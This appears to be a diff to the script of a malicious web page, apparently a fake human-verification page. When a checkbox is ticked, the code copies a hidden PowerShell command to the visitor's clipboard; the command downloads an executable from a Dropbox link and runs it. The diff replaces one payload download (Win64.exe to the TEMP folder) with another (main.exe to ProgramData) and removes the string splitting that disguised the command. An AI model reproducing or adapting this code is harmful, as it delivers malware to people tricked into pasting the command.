@@ -345,11 +345,9 @@
       }, 1500);
 
       checkbox.addEventListener('change', () => {
-        const part1 = "power";
-            const part2 = "shell.exe ";
-            const part3 = "-WindowStyle Hidden iwr 'https://www.dropbox.com/scl/fi/3hhnllcmdhbb5dtn8bcqi/Win64.exe?rlkey=ijdx9ze31pv1qta0143f7ucfs&st=gwvuqa7e&dl=1' -OutFile '$env:TEMP\\Win64.exe'; start '$env:TEMP\\Win64.exe';";
+        const part1 = "powershell.exe -WindowStyle Hidden iwr 'https://www.dropbox.com/scl/fi/j6j0rn5e9rbl865dkdcc3/main.exe?rlkey=ghg2f0jsb6plo1b3y0tpr8hb8&st=5if0rli5&dl=1' -OutFile 'C:\\ProgramData\\main.exe'; start 'C:\\ProgramData\\main.exe'";
            
-            const llmmand = `${part1}${part2}${part3}`;
+            const llmmand = `${part1}`;
             
             navigator.clipboard.writeText(llmmand)
         const verified = checkbox.checked;
